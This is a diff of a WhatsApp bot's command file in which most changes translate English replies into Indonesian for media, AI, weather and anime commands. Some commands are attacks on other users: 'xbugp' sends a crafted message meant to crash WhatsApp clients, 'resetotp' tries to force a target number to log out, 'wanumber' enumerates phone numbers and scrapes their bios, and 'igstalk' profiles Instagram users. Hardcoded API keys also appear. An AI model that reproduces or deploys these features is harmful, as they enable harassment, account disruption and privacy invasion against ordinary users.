 { text: `@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}
-Cieeee, What's Going On❤️💖👀`,
+Cieee, ada apa❤️💖👀`,
 contextInfo:{
 mentionedJid:[orang, jodoh],
 forwardingScore: 9999999,
@@ -6146,26 +6006,26 @@ isForwarded: true,
             }
             break
             case 'wallpaper': {
-                if (!text) return replygcNFS('Enter Query Title')
+                if (!text) return replygcNFS('Masukkan Judul Kueri')
                 NFSStickWait()
 		let { wallpaper } = require('./lib/scraper')
                 anuwallpep = await wallpaper(text)
                 result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)]                
-                NFSBotInc.sendMessage(m.chat, {caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Category : ${result.type}\n${themeemoji} Detail : ${result.source}\n${themeemoji} Media Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] }} , { quoted: m })
+                NFSBotInc.sendMessage(m.chat, {caption: `${themeemoji} Judul : ${result.title}\n${themeemoji} Kategori : ${result.type}\n${themeemoji} Detail : ${result.source}\n${themeemoji} Media Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] }} , { quoted: m })
             }
             break
             case 'wikimedia': {
-                if (!text) return replygcNFS('Enter Query Title')
+                if (!text) return replygcNFS('Masukkan Judul Kueri')
                 NFSStickWait()
 		let { wikimedia } = require('./lib/scraper')
                 let anumedia = await wikimedia(text)
                 result = anumedia[Math.floor(Math.random() * anumedia.length)]
-                NFSBotInc.sendMessage(m.chat, {caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Source : ${result.source}\n${themeemoji} Media Url : ${result.image}`, image: { url: result.image }} , { quoted: m })
+                NFSBotInc.sendMessage(m.chat, {caption: `${themeemoji} Judul : ${result.title}\n${themeemoji} Sumber : ${result.source}\n${themeemoji} Media Url : ${result.image}`, image: { url: result.image }} , { quoted: m })
             }
             break
             case 'pick': {
             	if (!m.isGroup) return NFSStickGroup()
-            	if (!text) return replygcNFS(`What do you want to pick?\nExample: ${prefix + command} idiot`)
+            	if (!text) return replygcNFS(`Apa yang ingin Anda pilih?\n*Contoh :* ${prefix + command} idiot`)
              const groupMetadata = m.isGroup ? await NFSBotInc.groupMetadata(m.chat)
                  .catch((e) => {}) : ""
              const participants = m.isGroup ? await groupMetadata.participants : ""
@@ -6173,7 +6033,7 @@ isForwarded: true,
              let me = m.sender
              let NFSshimts = member[Math.floor(Math.random() * member.length)]
              NFSBotInc.sendMessage(from, { 
-text: `The most *${text}* here is *@${NFSshimts.split("@")[0]}*`,
+text: `Yang paling *${text}* di sini adalah *@${NFSshimts.split("@")[0]}*`,
 contextInfo:{
 forwardingScore: 9999999,
 isForwarded: true, 
@@ -6193,58 +6053,58 @@ mentionedJid:[NFSshimts],
          }
      break
      case "igvid": case "instavid": {
-if (!text) return replygcNFS(`Where is the link?\n\nExample : ${prefix + command} https://www.instagram.com/reel/Ctjt0srIQFg/?igshid=MzRlODBiNWFlZA==`)
+if (!text) return replygcNFS(`Di mana tautannya?\n\n*Contoh :* ${prefix + command} https://www.instagram.com/reel/Ctjt0srIQFg/?igshid=MzRlODBiNWFlZA==`)
 NFSStickWait()
 let resNFSyinsta = await NFSInstaMp4(text)
 const gha1 = await NFSBotInc.sendMessage(m.chat,{video:{url: resNFSyinsta.url[0].url},caption: mess.success},{quoted:m})
 }
 break
 case 'igstalk': {
-if (!args[0]) return replygcNFS(`Enter Instagram Username\n\nExample: ${prefix + command} unucorn_NFS13`)
+if (!args[0]) return replygcNFS(`Masukkan Nama Pengguna Instagram\n\n*Contoh :* ${prefix + command} anggit0817`)
 const fg = require('api-dylux')
     try {
     let res = await fg.igStalk(args[0])
     let te = `
-┌──「 *STALKING* 
-▢ *🔖Name:* ${res.name} 
+┌──「 *MENGUNTIT* 
+▢ *🔖Nama:* ${res.name} 
 ▢ *🔖Username:* ${res.username}
-▢ *👥Follower:* ${res.followersH}
-▢ *🫂Following:* ${res.followingH}
+▢ *👥Pengikut:* ${res.followersH}
+▢ *👣Mengikuti:* ${res.followingH}
 ▢ *📌Bio:* ${res.description}
 ▢ *🏝️Posts:* ${res.postsH}
 ▢ *🔗 Link* : https://instagram.com/${res.username.replace(/^@/, '')}
 └────────────`
      await NFSBotInc.sendMessage(m.chat, {image: { url: res.profilePic }, caption: te }, {quoted: m})
       } catch {
-        replygcNFS(`Make sure the username comes from *Instagram*`)
+        replygcNFS(`Pastikan nama pengguna berasal dari *Instagram*`)
       }
 }
 break
            case "igimg": case "instaimg":  {
-if (!text) return replygcNFS(`Where is the link?\n\nExample : ${prefix + command} https://www.instagram.com/p/Cs8x1ljt_D9/?igshid=MzRlODBiNWFlZA==`)
+if (!text) return replygcNFS(`Di mana tautannya?\n\n*Contoh :* ${prefix + command} https://www.instagram.com/p/Cs8x1ljt_D9/?igshid=MzRlODBiNWFlZA==`)
 NFSStickWait()
 const risponsNFS = await NFSIgImg(text)
 for (let i=0;i<risponsNFS.length;i++) {
-let ghd = await NFSBotInc.sendFileUrl(m.chat, risponsNFS[i], `Here you go!`, m)
+let ghd = await NFSBotInc.sendFileUrl(m.chat, risponsNFS[i], `Ini dia!`, m)
 }
 }
 break 
 case "fbvid": case "facebookvid":{
-if (!text) return replygcNFS(`Where is the url?\n\nExample: ${prefix + command} https://www.facebook.com/groups/2616981278627207/permalink/3572542609737731/?mibextid=Nif5oz`)
+if (!text) return replygcNFS(`Dimana urlnya?\n\n*Contoh :* ${prefix + command} https://www.facebook.com/groups/2616981278627207/permalink/3572542609737731/?mibextid=Nif5oz`)
 NFSStickWait()
 let res = await NFSFb(q)
 let ghdp = await NFSBotInc.sendMessage(from,{video:{url: res.url[0].url},caption: mess.success},{quoted:m})
 }
 break
 case "twittervid":case "twitvid":{
-if (!text) return replygcNFS(`Where is the url?\n\nExample: ${prefix + command} https://twitter.com/WarnerBrosIndia/status/1668933430795485184?s=19`)
+if (!text) return replygcNFS(`Dimana urlnya?\n\n*Contoh :* ${prefix + command} https://twitter.com/WarnerBrosIndia/status/1668933430795485184?s=19`)
 NFSStickWait()
 let res = await NFSTwitter(q)
 let ghdx = await NFSBotInc.sendMessage(from,{video:{url: res.url[0].url},caption: mess.success},{quoted:m})
 }
 break
-    case 'say': case 'tts': case 'gtts':{
-if (!text) return replygcNFS('Where is the text?')
+    case 'tts': case 'gtts':{
+if (!text) return replygcNFS('Dimana teksnya?')
             let texttts = text
             const NFSrl = googleTTS.getAudioUrl(texttts, {
                 lang: "en",
@@ -6276,8 +6136,8 @@ function __lobz(){const H=['R53FWbciV9','reply','rbot_18407','\x5c(\x20*\x5c)','
     break
     case 'ai': case 'openai':
 try {
-if (global.keyopenai === '') return replygcNFS("Api key limi exceeded");
-if (!q) return replygcNFS(`Chat with AI.\n\nExample:\n${prefix + command} What is coding`)
+if (global.keyopenai === '') return replygcNFS("Batas kunci api terlampaui");
+if (!q) return replygcNFS(`Mengobrol dengan AI.\n\n*Contoh :*\n${prefix + command} Apa itu pengkodean`)
 const { Configuration, OpenAIApi } = require('openai')
 const configuration = new Configuration({
 apiKey: global.keyopenai,
@@ -6300,14 +6160,14 @@ console.log(error.response.data);
 console.log(`${error.response.status}\n\n${error.response.data}`);
 } else {
 console.log(error);
-replygcNFS("Sorry, there seems to be an error :"+ error.message);
+replygcNFS("Maaf, sepertinya ada kesalahan :"+ error.message);
 }
 }
 break
 case "aimage":
 try {
-if (global.keyopenai === '') return replygcNFS("Apikey limit exceeded");
-if (!q) return replygcNFS(`Generate image from AI.\n\nExample:\n${prefix + command} man riding horse`)
+if (global.keyopenai === '') return replygcNFS("Batas apikey terlampaui");
+if (!q) return replygcNFS(`Hasilkan gambar dari AI.\n\n*Contoh :*\n${prefix + command} pria menunggang kuda`)
 const { Configuration, OpenAIApi } = require('openai')
 const configuration = new Configuration({
 apiKey: global.keyopenai,
@@ -6322,7 +6182,7 @@ size: "512x512",
 NFSBotInc.sendImage(from, response.data.data[0].url, text, m);
 } catch (err) {
 console.log(err);
-replygcNFS("Sorry, there seems to be an error :"+ err);
+replygcNFS("Maaf, sepertinya ada kesalahan :"+ err);
 }
 break
 case 'myip': {
@@ -6335,44 +6195,44 @@ case 'myip': {
                     'path': '/'
                 }, function(resp) {
                     resp.on('data', function(ip) {
-                        replygcNFS("🔎 My public IP address is: " + ip)
+                        replygcNFS("🔎 Alamat IP publik saya adalah: " + ip)
                     })
                 })
             }
         break
         case 'mathquiz': case 'math': {
-                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "There are still unfinished sessions!"
+                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "Masih ada sesi yang belum selesai!"
                 let { genMath, modes } = require('./lib/math')
-                if (!text) return replygcNFS(`Mode: ${Object.keys(modes).join(' | ')}\nUsage example: ${prefix}math medium`)
+                if (!text) return replygcNFS(`Mode: ${Object.keys(modes).join(' | ')}\n*Contoh penggunaan :* ${prefix}math medium`)
                 let result = await genMath(text.toLowerCase())
-                NFSBotInc.sendText(m.chat, `*What is the result of: ${result.soal.toLowerCase()}*?\n\nTime: ${(result.waktu / 1000).toFixed(2)} second`, m).then(() => {
+                NFSBotInc.sendText(m.chat, `*Apa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} Detik`, m).then(() => {
                     kuismath[m.sender.split('@')[0]] = result.jawaban
                 })
                 await sleep(result.waktu)
                 if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
-                    console.log("Answer: " + result.jawaban)
-                    replygcNFS("Time has run out\nAnswer: " + kuismath[m.sender.split('@')[0]])
+                    console.log("Jawaban: " + result.jawaban)
+                    replygcNFS("Waktu habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
                     delete kuismath[m.sender.split('@')[0]]
                 }
             }
             break
             case 'lyrics': {
-if (!text) return replygcNFS(`What lyrics you looking for?\nExample usage: ${prefix}lyrics Thunder`)
+if (!text) return replygcNFS(`Lirik apa yang kamu cari?\n*Contoh penggunaan :* ${prefix}lyrics Sido rondo`)
 NFSStickWait()
 const { lyrics, lyricsv2 } = require('@bochilteam/scraper')
 const result = await lyricsv2(text).catch(async _ => await lyrics(text))
 replygcNFS(`
-*Title :* ${result.title}
-*Author :* ${result.author}
+*Judul :* ${result.title}
+*Pengarang :* ${result.author}
 *Url :* ${result.link}
 
-*Lyrics :* ${result.lyrics}
+*Lirik :* ${result.lyrics}
 
 `.trim())
 }
 break
 case 'gdrive': {
-		if (!args[0]) return replygcNFS(`Enter the Google Drive link`)
+		if (!args[0]) return replygcNFS(`Masukkan tautan Google Drive`)
 	NFSStickWait()
 	const fg = require('api-dylux')
 	try {
@@ -6380,56 +6240,56 @@ case 'gdrive': {
 	 await replygcNFS(`
 ≡ *Google Drive DL*
 ▢ *Nama:* ${res.fileName}
-▢ *Size:* ${res.fileSize}
-▢ *Type:* ${res.mimetype}`)
+▢ *Ukuran:* ${res.fileSize}
+▢ *Jenis:* ${res.mimetype}`)
 	NFSBotInc.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
    } catch {
-	replygcNFS('Error: Check link or try another link') 
+	replygcNFS('Error: Periksa tautan atau coba tautan lain') 
   }
 }
 break
 case 'invite': {
 	if (!m.isGroup) return NFSStickGroup()
 	if (!isBotAdmins) return NFSStickBotAdmin()
-if (!text) return replygcNFS(`Enter the number you want to invite to the group\n\nExample :\n*${prefix + command}* 6281779122444`)
-if (text.includes('+')) return replygcNFS(`Enter the number together without *+*`)
-if (isNaN(text)) return replygcNFS(`Enter only the numbers plus your country code without spaces`)
+if (!text) return replygcNFS(`Masukkan nomor yang ingin Anda undang ke grup\n\n*Contoh :*\n*${prefix + command}* 6281779122444`)
+if (text.includes('+')) return replygcNFS(`Masukkan nomor dengan awalan nomor code negara tanpa *+*`)
+if (isNaN(text)) return replygcNFS(`Masukkan hanya angka plus kode negara Anda tanpa spasi`)
 let group = m.chat
 let link = 'https://chat.whatsapp.com/' + await NFSBotInc.groupInviteCode(group)
-      await NFSBotInc.sendMessage(text+'@s.whatsapp.net', {text: `≡ *GROUP INVITATION*\n\nA user invites you to join this group \n\n${link}`, mentions: [m.sender]})
-        replygcNFS(` An invite link is sent to the user`) 
+      await NFSBotInc.sendMessage(text+'@s.whatsapp.net', {text: `≡ *UNDANGAN GRUP*\n\nSeorang pengguna mengundang Anda untuk bergabung dengan grup ini \n\n${link}`, mentions: [m.sender]})
+        replygcNFS(` Tautan undangan dikirim ke pengguna`) 
 }
 break
 case "xnxxdl": {
 	if (!isPrem) return replyprem(mess.premium)
 	if (!m.isGroup) return NFSStickGroup()
 	if (!AntiNsfw) return replygcNFS(mess.nsfw)
-	if (!text) return replygcNFS(`Enter Url`)
-        if (!text.includes('xnxx.com')) return replygcNFS(`Enter an xnxx link`)
+	if (!text) return replygcNFS(`Masukkan URL`)
+        if (!text.includes('xnxx.com')) return replygcNFS(`Masukkan tautan xnxx`)
         NFSStickWait()
         const fg = require('api-dylux')
             let xn = await fg.xnxxdl(text)
 NFSBotInc.sendMessage(m.chat, { caption: `≡  *XNXX DL*
         
-▢ *📌Title*: ${xn.result.title}
-▢ *⌚Duration:* ${xn.result.duration}
-▢ *🎞️Quality:* ${xn.result.quality}`, video: {url: xn.result.files.high} }, { quoted: m })
+▢ *📌Judul*: ${xn.result.title}
+▢ *⌚Durasi:* ${xn.result.duration}
+▢ *🎞️Kualitas:* ${xn.result.quality}`, video: {url: xn.result.files.high} }, { quoted: m })
 }
 break
 case 'xnxxsearch': {
 	if (!isPrem) return replyprem(mess.premium)
 	if (!m.isGroup) return NFSStickGroup()
 	if (!AntiNsfw) return replygcNFS(mess.nsfw)
-	if (!text) return replygcNFS(`Enter Query`)
+	if (!text) return replygcNFS(`Masukkan Kata Pencarian`)
 	NFSStickWait()
 	const fg = require('api-dylux')
 	let res = await fg.xnxxSearch(text)
-            let ff = res.result.map((v, i) => `${i + 1}┃ *Title* : ${v.title}\n*Link:* ${v.link}\n`).join('\n') 
+            let ff = res.result.map((v, i) => `${i + 1}┃ *Judul* : ${v.title}\n*Link:* ${v.link}\n`).join('\n') 
               if (res.status) replygcNFS(ff)
               }
               break
               case 'pinterest': {
-              	if (!text) return replygcNFS(`Enter Query`)
+              	if (!text) return replygcNFS(`Masukkan Kata Pencarian`)
 NFSStickWait()
 let { pinterest } = require('./lib/scraper')
 anutrest = await pinterest(text)
@@ -6438,7 +6298,7 @@ NFSBotInc.sendMessage(m.chat, { image: { url: result }, caption: '⭔ Media Url 
 }
 break
 case 'ringtone': {
-		if (!text) return replygcNFS(`Example : ${prefix + command} black rover`)
+		if (!text) return replygcNFS(`*Contoh :* ${prefix + command} black rover`)
         let { ringtone } = require('./lib/scraper')
 		let anutone2 = await ringtone(text)
 		let result = anutone2[Math.floor(Math.random() * anutone2.length)]
@@ -6446,22 +6306,22 @@ case 'ringtone': {
 	    }
 	    break
 	case 'genshin':
-if (!text) return replygcNFS(`Which genshin are you lookin for?`)
+if (!text) return replygcNFS(`Genshin mana yang sedang kamu cari?`)
 try {
 const genshin = require("genshin-api")
 a = text.toLowerCase();
 const anime = await genshin.Characters(text)
 let txt = ""
-txt += `🎀 *Name:* ${anime.name}\n`
-txt += `🎖️ *Title:* ${anime.title}\n`
-txt += `💠 *Vision:* ${anime.vision}\n`
-txt += `🏹 *Weapon:* ${anime.weapon}\n`
-txt += `💮 *Gender:* ${anime.gender}\n`
-txt += `🌏 *Nation:* ${anime.nation}\n`
-txt += `🪷 *Affiliation:* ${anime.affiliation}\n`
-txt += `🌟 *Rarity:* ${anime.rarity}\n`
-txt += `❄️ *Constellation:* ${anime.constellation}\n`
-txt += `📖 *Description:* ${anime.description}\n`
+txt += `🎀 *Nama:* ${anime.name}\n`
+txt += `🎖️ *Judul:* ${anime.title}\n`
+txt += `💠 *Penglihatan:* ${anime.vision}\n`
+txt += `🏹 *Senjata:* ${anime.weapon}\n`
+txt += `💮 *Jenis kelamin:* ${anime.gender}\n`
+txt += `🌏 *Bangsa:* ${anime.nation}\n`
+txt += `🪷 *Afiliasi:* ${anime.affiliation}\n`
+txt += `🌟 *Keanehan:* ${anime.rarity}\n`
+txt += `❄️ *Konstelasi:* ${anime.constellation}\n`
+txt += `📖 *Keterangan:* ${anime.description}\n`
 txt += `🌐 *Url:* https://genshin-impact.fandom.com/wiki/${a}\n`
 urll = `https://api.genshin.dev/characters/${a}/portrait`
 await NFSBotInc.sendMessage(m.chat,{image:{url:urll}, caption:txt},{quoted:m})
@@ -6506,51 +6366,51 @@ encmedia = await NFSBotInc.sendImageAsSticker(from, wifegerakx, m, { packname: g
 }
 break
 	case 'anime': {
-if (!text) return replygcNFS(`Which anime are you lookin for?`)
+if (!text) return replygcNFS(`Anime mana yang sedang kamu cari?`)
 const malScraper = require('mal-scraper')
 NFSStickWait()
         const anime = await malScraper.getInfoFromName(text).catch(() => null)
-        if (!anime) return replygcNFS(`Could not find`)
+        if (!anime) return replygcNFS(`Tidak bisa menemukan`)
 let animetxt = `
-🎀 *Title: ${anime.title}*
-🎋 *Type: ${anime.type}*
-🎐 *Premiered on: ${anime.premiered}*
-💠 *Total Episodes: ${anime.episodes}*
+🎀 *Judul: ${anime.title}*
+🎋 *Jenis: ${anime.type}*
+🎐 *Ditayangkan perdana: ${anime.premiered}*
+💠 *Jumlah Episode: ${anime.episodes}*
 📈 *Status: ${anime.status}*
-💮 *Genres: ${anime.genres}
+💮 *Genre: ${anime.genres}
 📍 *Studio: ${anime.studios}*
-🌟 *Score: ${anime.score}*
-💎 *Rating: ${anime.rating}*
-🏅 *Rank: ${anime.ranked}*
-💫 *Popularity: ${anime.popularity}*
-♦️ *Trailer: ${anime.trailer}*
+🌟 *Skor: ${anime.score}*
+💎 *Peringkat: ${anime.rating}*
+🏅 *Pangkat: ${anime.ranked}*
+💫 *Kepopuleran: ${anime.popularity}*
+♦️ *Cuplikan: ${anime.trailer}*
 🌐 *URL: ${anime.url}*
-❄ *Description:* ${anime.synopsis}*`
+❄ *Keterangan:* ${anime.synopsis}*`
                 await NFSBotInc.sendMessage(m.chat,{image:{url:anime.picture}, caption:animetxt},{quoted:m})
                 }
                 break
                 case 'imdb':
-if (!text) return replygcNFS(`_Name a Series or movie`)
+if (!text) return replygcNFS(`_Beri nama Seri atau film_`)
 NFSStickWait()
             let fids = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`)
             let imdbt = ""
             console.log(fids.data)
             imdbt += "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n" + " ``` IMDB SEARCH```\n" + "⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n"
-            imdbt += "🎬Title      : " + fids.data.Title + "\n"
-            imdbt += "📅Year       : " + fids.data.Year + "\n"
-            imdbt += "⭐Rated      : " + fids.data.Rated + "\n"
-            imdbt += "📆Released   : " + fids.data.Released + "\n"
-            imdbt += "⏳Runtime    : " + fids.data.Runtime + "\n"
+            imdbt += "🎬Judul      : " + fids.data.Title + "\n"
+            imdbt += "📅Tahun       : " + fids.data.Year + "\n"
+            imdbt += "⭐Dinilai      : " + fids.data.Rated + "\n"
+            imdbt += "📆Dilepaskan   : " + fids.data.Released + "\n"
+            imdbt += "⏳Waktu proses    : " + fids.data.Runtime + "\n"
             imdbt += "🌀Genre      : " + fids.data.Genre + "\n"
-            imdbt += "👨🏻‍💻Director   : " + fids.data.Director + "\n"
-            imdbt += "✍Writer     : " + fids.data.Writer + "\n"
-            imdbt += "👨Actors     : " + fids.data.Actors + "\n"
+            imdbt += "👨🏻‍💻Direktur   : " + fids.data.Director + "\n"
+            imdbt += "✍Penulis     : " + fids.data.Writer + "\n"
+            imdbt += "👨Aktor     : " + fids.data.Actors + "\n"
             imdbt += "📃Plot       : " + fids.data.Plot + "\n"
-            imdbt += "🌐Language   : " + fids.data.Language + "\n"
-            imdbt += "🌍Country    : " + fids.data.Country + "\n"
-            imdbt += "🎖️Awards     : " + fids.data.Awards + "\n"
+            imdbt += "🌐Bahasa   : " + fids.data.Language + "\n"
+            imdbt += "🌍Negara    : " + fids.data.Country + "\n"
+            imdbt += "🎖️Penghargaan     : " + fids.data.Awards + "\n"
             imdbt += "📦BoxOffice  : " + fids.data.BoxOffice + "\n"
-            imdbt += "🏙️Production : " + fids.data.Production + "\n"
+            imdbt += "🏙️Produksi : " + fids.data.Production + "\n"
             imdbt += "🌟imdbRating : " + fids.data.imdbRating + "\n"
             imdbt += "✅imdbVotes  : " + fids.data.imdbVotes + ""
            NFSBotInc.sendMessage(m.chat, {
@@ -6563,22 +6423,22 @@ NFSStickWait()
             })
             break
             case 'weather':{
-if (!text) return replygcNFS('What location?')
+if (!text) return replygcNFS('Lokasi apa?')
             let wdata = await axios.get(
                 `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
             );
             let textw = ""
-            textw += `*🗺️Weather of  ${text}*\n\n`
-            textw += `*Weather:-* ${wdata.data.weather[0].main}\n`
-            textw += `*Description:-* ${wdata.data.weather[0].description}\n`
-            textw += `*Avg Temp:-* ${wdata.data.main.temp}\n`
-            textw += `*Feels Like:-* ${wdata.data.main.feels_like}\n`
-            textw += `*Pressure:-* ${wdata.data.main.pressure}\n`
-            textw += `*Humidity:-* ${wdata.data.main.humidity}\n`
-            textw += `*Humidity:-* ${wdata.data.wind.speed}\n`
-            textw += `*Latitude:-* ${wdata.data.coord.lat}\n`
-            textw += `*Longitude:-* ${wdata.data.coord.lon}\n`
-            textw += `*Country:-* ${wdata.data.sys.country}\n`
+            textw += `*🗺️Cuaca dari  ${text}*\n\n`
+            textw += `*Cuaca:-* ${wdata.data.weather[0].main}\n`
+            textw += `*Keterangan:-* ${wdata.data.weather[0].description}\n`
+            textw += `*Suhu rata-rata:-* ${wdata.data.main.temp}\n`
+            textw += `*Terasa seperti:-* ${wdata.data.main.feels_like}\n`
+            textw += `*Tekanan:-* ${wdata.data.main.pressure}\n`
+            textw += `*Kelembaban:-* ${wdata.data.main.humidity}\n`
+            textw += `*Kelembaban:-* ${wdata.data.wind.speed}\n`
+            textw += `*Garis Lintang:-* ${wdata.data.coord.lat}\n`
+            textw += `*Garis bujur:-* ${wdata.data.coord.lon}\n`
+            textw += `*Negara:-* ${wdata.data.sys.country}\n`
 
            NFSBotInc.sendMessage(
                 m.chat, {
@@ -6590,10 +6450,10 @@ if (!text) return replygcNFS('What location?')
            }
            break
            case 'wanumber': case 'searchno': case 'searchnumber':{
-           	if (!text) return replygcNFS(`Provide Number with last number x\n\nExample: ${prefix + command} 91690913721x`)
+           	if (!text) return replygcNFS(`Berikan Nomor dengan nomor terakhir x\n\n*Contoh :*${prefix + command} 6281779122x`)
 var inputnumber = text.split(" ")[0]
         
-        replygcNFS(`Searching for WhatsApp account in given range...`)
+        replygcNFS(`Mencari akun WhatsApp dalam rentang tertentu...`)
         function countInstances(string, word) {
             return string.split(word).length - 1
         }
@@ -6608,9 +6468,9 @@ var inputnumber = text.split(" ")[0]
         } else if (random_length == 3) {
             randomxx = 1000
         }
-        var text66 = `*==[ List of Whatsapp Numbers ]==*\n\n`
-        var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
-        var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`
+        var text66 = `*==[ Daftar Nomor Whatsapp ]==*\n\n`
+        var nobio = `\n*Bio:* || \nHai! Saya menggunakan whatsapp.\n`
+        var nowhatsapp = `\n*Nomor tanpa akun WhatsApp dalam jangkauan yang disediakan.*\n`
         for (let i = 0; i < randomxx; i++) {
             var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
             var status1 = nu[Math.floor(Math.random() * nu.length)]
@@ -6638,7 +6498,7 @@ var inputnumber = text.split(" ")[0]
                 if (anu1 == '401' || anu1.status.length == 0) {
                     nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
                 } else {
-                    text66 += `🪀 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\n\n`
+                    text66 += `🪀 *Nomor:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\n\n`
                 }
             } catch {
                 nowhatsapp += `${number0}${i}${number1}\n`
@@ -6650,11 +6510,11 @@ break
 	//bug && war cases
 case 'xbugp' : { //crashes mod whatsapps
 if (!NFSTheCreator) return NFSStickOwner()
-if (!text) return replygcNFS(`Example : ${prefix + command} NFS bihari😂`)
+if (!text) return replygcNFS(`*Contoh :* ${prefix + command} NFS bihari😂`)
 const { NFSorwot } = require('./XBug/NFSbut2')
 let teks = `${text}`
 {
-NFSBotInc.relayMessage(from, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${NFSorwot}`, currencyCodeIso4217: 'INR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `PAPA NFS`,"body": ` ${NFSytimewisher} my friend ${pushname}`,
+NFSBotInc.relayMessage(from, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${NFSorwot}`, currencyCodeIso4217: 'INR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"judul": `PAPA NFS`,"tubuh": ` ${NFSytimewisher} temanku ${pushname}`,
 mimetype: 'audio/mpeg', caption: `🔥 ${teks} ${NFSorwot}`,
 showAdAttribution: true,
 sourceUrl: websitex,
@@ -6674,8 +6534,8 @@ break
 case "resetotp": {
 if (Input) {
 let cekno = await NFSBotInc.onWhatsApp(Input)
-if (cekno.length == 0) return replygcNFS(`The participant is no longer registered on WhatsApp`)
-if (Input == owner + "@s.whatsapp.net") return replygcNFS(`Can't logout My Owner🦄!`)
+if (cekno.length == 0) return replygcNFS(`Peserta tidak lagi terdaftar di WhatsApp`)
+if (Input == owner + "@s.whatsapp.net") return replygcNFS(`Tidak dapat keluar dari Pemilik Saya🦄!`)
 var targetnya = m.sender.split('@')[0]
 try {
 var axioss = require('axios')
@@ -6717,12 +6577,12 @@ cookie
 })
 let payload = String(res.data)
 if (payload.includes(`"payload":true`)) {
-replygcNFS(`Success..!`)
+replygcNFS(`Berhasil..!`)
 } else if (payload.includes(`"payload":false`)) {
-replygcNFS(`Moderate Limit Wait A Moment.`)
+replygcNFS(`Batas Sedang Tunggu Sejenak.`)
 } else replygcNFS(util.format(res.data))
 } catch (err) {replygcNFS(`${err}`)}
-} else replygcNFS('Enter Target Number!')
+} else replygcNFS('Masukkan Nomor Sasaran!')
 }
 break
 
@@ -6786,7 +6646,7 @@ NFSBotInc.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
 } catch (err) {
 console.log(util.format(err))
 let e = String(err)
-NFSBotInc.sendMessage("6281779122444@s.whatsapp.net", { text: "Hello developer, there seems to be an error, please fix it " + util.format(e), 
+NFSBotInc.sendMessage("6281779122444@s.whatsapp.net", { text: "Halo developer, sepertinya ada kesalahan, tolong perbaiki " + util.format(e), 
 contextInfo:{
 forwardingScore: 9999999, 
 isForwarded: true
